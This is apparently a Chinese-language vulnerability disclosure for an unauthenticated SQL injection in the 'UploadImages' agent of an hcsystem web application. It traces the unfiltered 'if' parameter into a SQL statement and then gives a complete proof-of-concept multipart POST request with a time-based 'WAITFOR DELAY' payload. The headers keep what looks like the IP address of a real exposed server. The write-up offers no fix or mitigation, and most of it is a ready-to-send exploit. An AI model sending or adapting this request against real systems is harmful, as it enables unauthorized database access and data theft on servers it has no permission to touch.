在文件WEB-INF/hcsystem-config.xml，定义了<pageurl \name="RtePhotosPath" url="/openagent?agent=hcit.project.rte.agents.UploadImages"/>
![image](https://github.com/night-0p/anh/assets/54882616/02209125-a497-4546-89dd-8a7032ff005b)
不需要登陆即可访问。
![image](https://github.com/night-0p/anh/assets/54882616/d5c693a3-7abc-480e-ad20-687b90c6d294)
hcit.project.rte.agents.UploadImages.class
![image](https://github.com/night-0p/anh/assets/54882616/8f8dd79d-d756-4df8-a224-0454bfc51484)
由于this.if.getText()无任何过滤，直接拼接到语句里面，造成了SQL注入漏洞。
![image](https://github.com/night-0p/anh/assets/54882616/ae32e650-a50b-47ed-b79c-a7d8dba306bd)
POC:
```
POST /openagent?agent=hcit.project.rte.agents.UploadImages HTTP/1.1
Host: xxx.xxx.xxx.xxx:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------320094836112074435372695393608
Content-Length: 845
Origin: http://223.76.123.194:8888
Connection: close
Referer: http://223.76.123.194:8888/openagent?agent=hcit.project.rte.agents.UploadImages
Cookie: JSESSIONID=1811ADB22D03B7A2EBEC4BE979665E0E.tomcat1
Upgrade-Insecure-Requests: 1

-----------------------------320094836112074435372695393608
Content-Disposition: form-data; name="__EVENTTARGET"

xaE65h`odxxhBaxE65paA
-----------------------------320094836112074435372695393608
Content-Disposition: form-data; name="__EVENTARGUMENT"


-----------------------------320094836112074435372695393608
Content-Disposition: form-data; name="do"; filename=""
Content-Type: application/octet-stream


-----------------------------320094836112074435372695393608
Content-Disposition: form-data; name="if"

000';WAITFOR DELAY '0:0:5'--
-----------------------------320094836112074435372695393608
Content-Disposition: form-data; name="a"


-----------------------------320094836112074435372695393608
Content-Disposition: form-data; name="__VIEWSTATE"


-----------------------------320094836112074435372695393608--

```
![15111712482245_ pic](https://github.com/night-0p/anh/assets/54882616/ca78fd8b-17ab-4bd2-b869-88653121a63e)






